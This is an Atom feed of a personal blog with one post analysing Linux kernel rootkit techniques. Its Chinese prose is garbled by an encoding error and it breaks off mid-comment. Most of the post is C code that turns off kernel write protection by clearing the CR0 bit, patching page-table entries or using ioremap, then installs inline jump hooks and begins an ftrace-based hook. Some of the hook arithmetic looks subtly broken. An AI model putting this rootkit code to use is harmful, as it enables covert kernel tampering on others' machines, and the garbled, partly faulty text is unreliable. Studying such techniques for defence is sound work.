<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://196082.github.io/atom.xml" rel="self"/>
  
  <link href="https://196082.github.io/"/>
  <updated>2024-06-03T11:40:38.058Z</updated>
  <id>https://196082.github.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux Rootkitç°ä»£æŠ€æœ¯åˆ†æ</title>
    <link href="https://196082.github.io/2024/06/03/Linux-Rootkit%E7%8E%B0%E4%BB%A3%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    <id>https://196082.github.io/2024/06/03/Linux-Rootkit%E7%8E%B0%E4%BB%A3%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</id>
    <published>2024-06-03T11:39:56.000Z</published>
    <updated>2024-06-03T11:40:38.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”±äºæ‡’ç‹—ç—‡å‘ä½œåŠ ä¸Šæ¯å¤©æ²‰è¿·æ¸¸æˆå¯¼è‡´å¾ˆä¹…æ²¡æœ‰æ›´æ–°æ–‡ç« äº†ï¼Œå…¶å®ä¸Šä¸€ç¯‡çš„Rootkitå…¶å®éƒ½æ˜¯æ®‹ç¼ºç‰ˆä½†æ˜¯ä¸æƒ³ç»§ç»­å†™äº†å°±ç›´æ¥åŠ äº†ä¸ªå…¥é—¨ä¸¤ä¸ªå­—å°±å‘å‡ºæ¥äº†ğŸ˜´ã€‚è¿™ä¸€ç¯‡æ–‡ç« ä¸»è¦æ˜¯åœ¨ä¸Šä¸€ç¯‡æ–‡ç« çš„åŸºç¡€ä¸Šè¿›è¡Œä¸€ç³»åˆ—çš„æ‹“å±•ä»¥åŠè¡¥å……ï¼Œç›®å‰çœ‹æ¥ä¹Ÿæ˜¯æœ€åä¸€ç¯‡å…³äºrootkitçš„æ–‡ç« ã€‚</p><p>å·²ç»æ˜¯ç©äº†å‡ ä¸ªæœˆäº†ï¼Œæ–‡ç« åªå­—æœªåŠ¨ã€‚æ‡’ç‹—çš„é†’æ‚Ÿï¼</p><h2 id="å‡½æ•°åŠ«æŒ"><a href="#å‡½æ•°åŠ«æŒ" class="headerlink" title="å‡½æ•°åŠ«æŒ"></a>å‡½æ•°åŠ«æŒ</h2><p>rootkitä½œä¸ºå­˜åœ¨äºLinuxå†…æ ¸æ€ï¼Œè¿™ä¹Ÿæ„å‘³ç€rootkitæ‹¥æœ‰ç€è¶…çº§é«˜çš„æƒé™ï¼Œåœ¨éœ€è¦å®Œæˆä¸€äº›ç‰¹å®šçš„ç›®çš„æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹å†…æ ¸ä¸­å‡½æ•°æ¥å®Œæˆã€‚ä¾‹å¦‚åœ¨éœ€è¦è¿›è¡Œæ–‡ä»¶éšè—æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹<code>getdents</code>å‡½æ•°æ¥å®ç°ã€‚</p><h3 id="ä¿®æ”¹åªè¯»å†…å­˜"><a href="#ä¿®æ”¹åªè¯»å†…å­˜" class="headerlink" title="ä¿®æ”¹åªè¯»å†…å­˜"></a>ä¿®æ”¹åªè¯»å†…å­˜</h3><p>è¿™é‡Œç®€å•åˆ†æä¸‰ç§æ–¹æ³•æ¥ä¿®æ”¹å†…æ ¸ä¸­åªè¯»å†…å­˜æ®µã€‚</p><p><strong>æ–¹æ³•ä¸€ï¼šä¿®æ”¹cr0å¯„å­˜å™¨</strong></p><p>åªè¯»ä¿æŠ¤çš„å¼€å…³å…¶å®æ˜¯ç”±cr0å¯„å­˜å™¨ä¸­çš„<code>write protect</code>ä½å†³å®šçš„ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦å°†cr0å¯„å­˜å™¨çš„è¿™ä¸€ä½ç½®0å³å¯å…³é—­åªè¯»ä¿æŠ¤ï¼Œä»è€Œæ”¹å†™å†…å­˜ä¸­åªè¯»åŒºåŸŸçš„æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">rootkit_read_cr0</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> cr0;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq  %%cr0, %%rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq  %%rax, %0;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;=r&quot;</span>(cr0)::<span class="string">&quot;%rax&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cr0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_cr0</span><span class="params">(<span class="keyword">size_t</span> cr0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq   %0, %%rax;  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;movq  %%rax, %%cr0;&quot;</span> ::<span class="string">&quot;r&quot;</span>(cr0) : <span class="string">&quot;%rax&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_disable_write_protect</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> cr0_val;</span><br><span class="line"></span><br><span class="line">    cr0_val = rootkit_read_cr0();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((cr0_val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cr0_val &amp;= ~(<span class="number">1</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        rootkit_write_cr0(cr0_val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_enable_write_protect</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> cr0_val;</span><br><span class="line"></span><br><span class="line">    cr0_val = rootkit_read_cr0();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!((cr0_val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        cr0_val |= (<span class="number">1</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        rootkit_write_cr0(cr0_val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_read_only_mem_by_cr0</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> orig_cr0;</span><br><span class="line"></span><br><span class="line">    orig_cr0 = rootkit_read_cr0();</span><br><span class="line"></span><br><span class="line">    rootkit_disable_write_protect();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(dst, src, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((orig_cr0 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        rootkit_enable_write_protect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼šç›´æ¥ä¿®æ”¹å†…æ ¸é¡µè¡¨é¡¹</strong></p><p>åœ¨å†…æ ¸ä¸­ç®¡ç†å†…å­˜é¡µä½¿ç”¨çš„æ˜¯é¡µè¡¨ï¼Œå› ä¸ºæ˜¯å¯¹é¡µè¿›è¡Œç®¡ç†çš„ç¼˜æ•…ï¼Œæ‰€ä»¥å†…å­˜åœ°å€éƒ½æ˜¯æŒ‰ç…§4Kå¯¹é½çš„ï¼Œæ„å‘³ç€åœ¨pteä¸­çš„64ä½åªéœ€è¦24ä½æ¥å¯¹ç‰©ç†åœ°å€è¿›è¡Œæ ‡è¯†ï¼Œå…¶ä½™çš„ä½åªæ ‡è¯†å½“å‰é¡µæ¡†çš„å±æ€§å¹¶ä¸”å½“å‰é¡µæ¡†æ˜¯å¦å¯å†™ä¹Ÿè¢«æ ‡è¯†åœ¨å…¶ä¸­ã€‚</p><p>å› æ­¤æˆ‘ä»¬æƒ³è¦å¯¹åªè¯»å†…å­˜è¿›è¡Œä¿®æ”¹å¯ä»¥ç›´æ¥ä¿®æ”¹æ‰å…¶å¯¹åº”é¡µè¡¨é¡¹çš„R/Wæ ‡è¯†ä½å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/pgtable_types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_romem_by_pte_patch</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> *dst_pte;</span><br><span class="line">    <span class="keyword">pte_t</span> orig_pte_val;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line"></span><br><span class="line">    dst_pte = lookup_address((<span class="keyword">unsigned</span> <span class="keyword">long</span>) dst, &amp;level);</span><br><span class="line">    orig_pte_val.pte = dst_pte-&gt;pte;</span><br><span class="line"></span><br><span class="line">    dst_pte-&gt;pte |= _PAGE_RW;</span><br><span class="line">    <span class="built_in">memcpy</span>(dst, src, len);</span><br><span class="line"></span><br><span class="line">    dst_pte-&gt;pte = orig_pte_val.pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸‰ï¼šé€šè¿‡ioremapå®ç°ç‰©ç†å†…å­˜ç›´æ¥æ”¹å†™</strong></p><p>è¿™é‡Œ<code>ioremap</code>å‡½æ•°çš„ä½œç”¨æ˜¯å°†ç‰©ç†åœ°å€é‡æ–°æ˜ å°„åˆ°ä¸€ä¸ªè™šæ‹Ÿåœ°å€ä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_read_only_mem_by_ioremap</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> dst_phys_page_addr, dst_offset;</span><br><span class="line">    <span class="keyword">size_t</span> dst_ioremap_addr;</span><br><span class="line"></span><br><span class="line">    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;</span><br><span class="line">    dst_offset = (<span class="keyword">size_t</span>)dst &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">    dst_ioremap_addr = (<span class="keyword">size_t</span>)ioremap(dst_phys_page_addr, len + <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dst_ioremap_addr + dst_offset, src, len);</span><br><span class="line">    iounmap(dst_ioremap_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡<code>virt_to_page</code>å’Œ<code>page_to_pfn</code>ä¸¤ä¸ªå‡½æ•°æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„åœ°å€çš„ç‰©ç†åœ°å€ï¼Œéšåè¿›è¡Œé‡æ–°æ˜ å°„ç›´æ¥ä¿®æ”¹æœ€å<code>iounmap</code>å³å¯ã€‚</p><h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><p><code>inline hook</code>å³å†…è”é’©å­æ˜¯ä¸€ç§æ¯”è¾ƒç»å…¸çš„æ€è·¯ï¼Œå…¶æ ¸å¿ƒåŸç†æ˜¯å°†å‡½æ•°ä¸­çš„hookç‚¹ä½ä¿®æ”¹ä¸ºä¸€ä¸ªè·³è½¬æŒ‡ä»¤ï¼Œä½¿å…¶è·³è½¬è‡³æ¶æ„ä»£ç å¤„ï¼Œåœ¨å®Œæˆæ¶æ„ä»£ç æ‰§è¡Œä¹‹åæ¢å¤æ‰§è¡ŒåŸæœ¬è¢«è·³è½¬æŒ‡ä»¤æ‰€è¦†ç›–æ‰çš„æŒ‡ä»¤å¹¶æœ€ç»ˆè·³è½¬å›åŸå‡½æ•°æœ¬è¯¥æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸ç ´ååŸå‡½æ•°åŠŸèƒ½æƒ…å†µä¸‹å®Œæˆæ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/test.png"                      alt="test"                ></p><p>ä½†æ˜¯å¯¹äºx86è€Œè¨€ï¼Œå…¶ä¸ºCISCæŒ‡ä»¤é›†ï¼ŒæŒ‡ä»¤çš„é•¿åº¦æ˜¯å¹¶ä¸å›ºå®šçš„ï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬åœ¨è¿›è¡Œinline hookçš„æ—¶å€™ä¸ä½†éœ€è¦å°†åŸæŒ‡ä»¤patchä¸ºè·³è½¬æŒ‡ä»¤ï¼Œè¿˜éœ€è¦ä¿å­˜å’Œè¯†åˆ«åŸæœ‰æŒ‡ä»¤ä¸€éåœ¨å®Œæˆæ¶æ„ä»£ç æ‰§è¡Œåè¿›è¡Œæ‰§è¡Œã€‚</p><h3 id="åŠ¨æ€inline-hookæŠ€æœ¯"><a href="#åŠ¨æ€inline-hookæŠ€æœ¯" class="headerlink" title="åŠ¨æ€inline hookæŠ€æœ¯"></a>åŠ¨æ€inline hookæŠ€æœ¯</h3><p>è¿™ä¸€æŠ€æœ¯æ˜¯a3å¤§ä½¬ç»™å‡ºçš„ä¸€ç§æ–°çš„æŠ€æœ¯ã€‚å…¶åŸç†ä¹Ÿè¾ƒä¸ºç®€å•ï¼Œä¸»è¦å®ç°ä»¥ä¸‹æ­¥éª¤å³å¯ï¼š</p><ol><li>  ä¿å­˜å°†è¢«hookç‚¹ä½ä¸Šçš„æ•°æ®ï¼ˆé•¿åº¦ä¸ºè·³è½¬æŒ‡ä»¤çš„é•¿åº¦ï¼‰</li><li>  ä¿®æ”¹hookç‚¹ä½ä¸ºè·³è½¬æŒ‡ä»¤ï¼Œä½¿ç¨‹åºæ‰§è¡Œæµèƒ½å¤Ÿè·³è½¬åˆ°æ¶æ„å‡½æ•°</li><li>  åœ¨æ¶æ„å‡½æ•°å†…éƒ¨å®ç°æ¢å¤hookç‚¹ä½çš„æ•°æ®ï¼Œéšåè°ƒç”¨hookç‚¹ä½</li><li>  æœ€åé‡æ–°å°†hookç‚¹ä½çš„æ•°æ®ä¿®æ”¹ä¸ºè·³è½¬æŒ‡ä»¤çš„é•¿åº¦ï¼Œä¹‹åæ­£å¸¸è¿”å›</li></ol><p>è¿™ç§æ–¹å¼ä¸ä¼šç ´åå‡½æ•°è°ƒç”¨æ ˆå¹¶ä¸”ä¹Ÿä¸éœ€è¦å¯¹hookç‚¹ä½ä¸Šçš„æŒ‡ä»¤åšè¯†åˆ«ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOOK_BUF_SZ 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_read_only_mem_by_ioremap</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> dst_phys_page_addr, dst_offset;</span><br><span class="line">    <span class="keyword">size_t</span> dst_ioremap_addr;</span><br><span class="line"></span><br><span class="line">    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;</span><br><span class="line">    dst_offset = (<span class="keyword">size_t</span>)dst &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">    dst_ioremap_addr = (<span class="keyword">size_t</span>)ioremap(dst_phys_page_addr, len + <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dst_ioremap_addr + dst_offset, src, len);</span><br><span class="line">    iounmap(dst_ioremap_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> hook_data[HOOK_BUF_SZ];</span><br><span class="line">    <span class="keyword">char</span> orig_data[HOOK_BUF_SZ];</span><br><span class="line">    <span class="keyword">size_t</span> (*orig_func)(<span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span> <span class="title">temp_hook_info</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">rootkit_evil_hook_fn_temp</span><span class="params">(<span class="keyword">size_t</span> arg0, <span class="keyword">size_t</span> arg1, <span class="keyword">size_t</span> arg2,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="keyword">size_t</span> arg3, <span class="keyword">size_t</span> arg4, <span class="keyword">size_t</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">6</span>], ret;</span><br><span class="line"></span><br><span class="line">    args[<span class="number">0</span>] = arg0;</span><br><span class="line">    args[<span class="number">1</span>] = arg1;</span><br><span class="line">    args[<span class="number">2</span>] = arg2;</span><br><span class="line">    args[<span class="number">3</span>] = arg3;</span><br><span class="line">    args[<span class="number">4</span>] = arg4;</span><br><span class="line">    args[<span class="number">5</span>] = arg5;</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func,</span><br><span class="line">                                           temp_hook_info.orig_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    ret = temp_hook_info.orig_func(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>],</span><br><span class="line">                                   args[<span class="number">3</span>], args[<span class="number">4</span>], args[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func,</span><br><span class="line">                                           temp_hook_info.hook_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_text_hook</span><span class="params">(<span class="keyword">void</span> *hook_dst, <span class="keyword">void</span> *new_dst, struct hook_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> jmp_offset;</span><br><span class="line"></span><br><span class="line">    info-&gt;orig_func = hook_dst;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;info-&gt;orig_data, info-&gt;orig_func, HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    jmp_offset = (<span class="keyword">size_t</span>)new_dst - (<span class="keyword">size_t</span>)hook_dst - <span class="number">12</span>;</span><br><span class="line">    info-&gt;hook_data[<span class="number">0</span>] = <span class="number">0xE9</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(&amp;info-&gt;hook_data[<span class="number">1</span>]) = jmp_offset;</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(info-&gt;orig_func, &amp;info-&gt;hook_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°åˆ™æ˜¯å¯¹åŠ¨æ€inline hookçš„å®ç°ä»£ç ã€‚</p><h3 id="ftrace-hook"><a href="#ftrace-hook" class="headerlink" title="ftrace hook"></a>ftrace hook</h3><p><code>ftrace</code>æ˜¯å†…æ ¸æä¾›çš„ä¸€ä¸ªè°ƒè¯•æ¡†æ¶ï¼Œå½“å†…æ ¸ç¼–è¯‘æ—¶å¼€å¯äº†<code>CONFIG_FUNCTION_TRACER</code>é€‰é¡¹å¯ä»¥ä½¿ç”¨<code>ftrace</code>æ¥å¯¹å†…æ ¸å‡½æ•°è°ƒç”¨è¿›è¡Œè¿½è¸ªã€‚</p><p><code>ftrace</code>é€šè¿‡åœ¨å‡½æ•°å¼€å¤´æ’å…¥<code>fentry</code>æˆ–<code>mcount</code>å®ç°ï¼Œä¸ºäº†é™ä½æ€§èƒ½æŸè€—ï¼Œåœ¨ç¼–è¯‘æ—¶ä¼šåœ¨å‡½æ•°çš„å¼€å¤´æ’å…¥ <code>nop</code> æŒ‡ä»¤ï¼Œå½“å¼€å¯ frace æ—¶å†åŠ¨æ€åœ°å°†å¾…è·Ÿè¸ªå‡½æ•°å¼€å¤´çš„ <code>nop</code> æŒ‡ä»¤æ›¿æ¢ä¸ºè·³è½¬æŒ‡ä»¤ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">ftrace_func_t</span>)</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> parent_ip,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct ftrace_ops *op, struct ftrace_regs *fregs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> &#123;</span></span><br><span class="line"><span class="keyword">ftrace_func_t</span>func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> __<span class="title">rcu</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"><span class="keyword">void</span>*<span class="keyword">private</span>;</span><br><span class="line"><span class="keyword">ftrace_func_t</span>saved_func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_FTRACE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops_hash</span><span class="title">local_hash</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops_hash</span>*<span class="title">func_hash</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops_hash</span><span class="title">old_hash</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>trampoline;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>trampoline_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">ftrace_ops_func_t</span>ops_func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_FTRACE_WITH_DIRECT_CALLS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>direct_call;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>ftrace</code>çš„æ ¸å¿ƒç»“æ„å°±æ˜¯<code>ftrace_ops</code>ï¼Œå…¶ä¸­çš„<code>func</code>æˆå‘˜å°±æ˜¯æœ€ç»ˆä¼šè¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ftrace_set_filter_ip - set a function to filter on in ftrace by address</span></span><br><span class="line"><span class="comment"> * @ops: the ops to set the filter with</span></span><br><span class="line"><span class="comment"> * @ip: the address to add to or remove from the filter.</span></span><br><span class="line"><span class="comment"> * @remove: non zero to remove the ip from the filter</span></span><br><span class="line"><span class="comment"> * @reset: non zero to reset all filters before applying this filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Filters denote which functions should be enabled when tracing is enabled</span></span><br><span class="line"><span class="comment"> * If @ip is NULL, it fails to update filter.</span></span><br><span class="line"><span class="comment"> 